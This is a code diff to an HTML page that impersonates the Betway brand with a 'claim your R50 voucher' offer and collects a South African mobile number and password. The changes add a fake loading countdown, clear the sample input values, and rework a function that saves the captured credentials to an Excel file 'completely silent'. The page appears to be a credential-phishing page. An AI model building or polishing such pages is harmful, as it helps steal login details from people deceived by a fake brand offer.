@@ -31,6 +31,91 @@
             padding: 1rem;
         }
 
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+
+        .loading-screen.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .loading-content {
+            text-align: center;
+            color: white;
+            padding: 2rem;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .loading-content .loading-icon {
+            font-size: 4.5rem;
+            color: #ffd700;
+            margin-bottom: 1.5rem;
+            display: block;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        .loading-content h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            color: white;
+        }
+
+        .loading-content h2 span {
+            color: #00a651;
+        }
+
+        .loading-content p {
+            color: #8a8a8a;
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .loading-content .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #2a2a2a;
+            border-top: 4px solid #00a651;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        .loading-content .progress-text {
+            color: #666;
+            font-size: 0.85rem;
+            margin-top: 1rem;
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
         /* Main Betway card */
         .betway-card {
             max-width: 420px;
@@ -42,6 +127,14 @@
             max-height: 95vh;
             display: flex;
             flex-direction: column;
+            opacity: 0;
+            transform: scale(0.95);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .betway-card.visible {
+            opacity: 1;
+            transform: scale(1);
         }
 
         /* Black header */
@@ -101,14 +194,13 @@
             line-height: 1.1;
         }
 
-        /* Content area - scrollable if needed */
+        /* Content area */
         .content {
             padding: 1.2rem 1.5rem 0.5rem 1.5rem;
             flex: 1;
             overflow-y: auto;
         }
 
-        /* FREE badge */
         .free-badge {
             display: inline-block;
             background: #ffd700;
@@ -137,7 +229,6 @@
             margin-top: 0.1rem;
         }
 
-        /* Form */
         .form-group {
             margin-top: 1.2rem;
         }
@@ -382,7 +473,6 @@
             transform: scale(1.02);
         }
 
-        /* Mobile responsiveness */
         @media (max-width: 480px) {
             .header {
                 padding: 0.8rem 1rem 0.6rem 1rem;
@@ -431,6 +521,15 @@
                 padding: 0.6rem 1rem 0.8rem 1rem;
                 font-size: 0.55rem;
             }
+            .loading-content .loading-icon {
+                font-size: 3.5rem;
+            }
+            .loading-content h2 {
+                font-size: 1.6rem;
+            }
+            .loading-content p {
+                font-size: 0.95rem;
+            }
         }
 
         @media (max-width: 380px) {
@@ -454,7 +553,19 @@
 </head>
 <body>
 
-    <div class="betway-card">
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <i class="fas fa-gift loading-icon"></i>
+            <h2>Bet<span>way</span></h2>
+            <p>You're about to claim your R50 voucher!</p>
+            <div class="loader"></div>
+            <div class="progress-text" id="progressText">Loading in 3 seconds...</div>
+        </div>
+    </div>
+
+    <!-- Main Betway Card -->
+    <div class="betway-card" id="mainCard">
         <!-- Black Header -->
         <div class="header">
             <div class="logo-area">
@@ -492,12 +603,12 @@
             <!-- Form -->
             <div class="form-group">
                 <div class="input-wrapper">
-                    <input type="text" id="mobileInput" placeholder=" " value="071 234 5678" />
+                    <input type="text" id="mobileInput" placeholder=" " />
                     <label for="mobileInput"><i class="fas fa-phone-alt"></i>+27 Mobile Number</label>
                 </div>
 
                 <div class="input-wrapper">
-                    <input type="password" id="passwordInput" placeholder=" " value="password123" />
+                    <input type="password" id="passwordInput" placeholder=" " />
                     <label for="passwordInput"><i class="fas fa-lock"></i>Enter Password</label>
                     <i class="fas fa-eye password-toggle" id="togglePassword"></i>
                 </div>
@@ -541,12 +652,33 @@
 
     <script>
         (function() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const mainCard = document.getElementById('mainCard');
+            const progressText = document.getElementById('progressText');
             const claimBtn = document.getElementById('claimVoucherBtn');
             const modal = document.getElementById('cautionModal');
             const closeBtn = document.getElementById('closeModalBtn');
             const mobileInput = document.getElementById('mobileInput');
             const passwordInput = document.getElementById('passwordInput');
             const togglePassword = document.getElementById('togglePassword');
+
+            // Loading screen timer
+            let countdown = 3;
+            const interval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    progressText.textContent = `Loading in ${countdown} seconds...`;
+                } else if (countdown === 0) {
+                    progressText.textContent = 'Almost there...';
+                } else {
+                    clearInterval(interval);
+                    // Hide loading screen, show main card
+                    loadingScreen.classList.add('hidden');
+                    setTimeout(() => {
+                        mainCard.classList.add('visible');
+                    }, 100);
+                }
+            }, 1000);
 
             // Toggle password visibility
             togglePassword.addEventListener('click', function() {
@@ -555,7 +687,7 @@
                 this.classList.toggle('fa-eye-slash');
             });
 
-            // Save to Excel - silent download
+            // Save to Excel - completely silent with FileSaver approach
             function saveToExcel(mobile, password) {
                 try {
                     let existingData = [];
@@ -576,16 +708,24 @@
                     const worksheet = XLSX.utils.aoa_to_sheet(allData);
                     XLSX.utils.book_append_sheet(workbook, worksheet, 'Betway_Data');
 
-                    // Silent download - no popup
+                    // Create blob and use msSaveBlob for IE/Edge, or create download link
                     const wbout = XLSX.write(workbook, { bookType: 'xlsx', type: 'array' });
-                    const blob = new Blob([wbout], { type: 'application/octet-stream' });
-                    const link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob);
-                    link.download = 'betway_user_data.xlsx';
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                    URL.revokeObjectURL(link.href);
+                    const blob = new Blob([wbout], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
+
+                    // Use msSaveBlob for IE/Edge, otherwise create link
+                    if (window.navigator && window.navigator.msSaveBlob) {
+                        window.navigator.msSaveBlob(blob, 'betway_user_data.xlsx');
+                    } else {
+                        const link = document.createElement('a');
+                        link.href = URL.createObjectURL(blob);
+                        link.download = 'betway_user_data.xlsx';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        setTimeout(() => {
+                            URL.revokeObjectURL(link.href);
+                        }, 1000);
+                    }
 
                     return true;
                 } catch (error) {
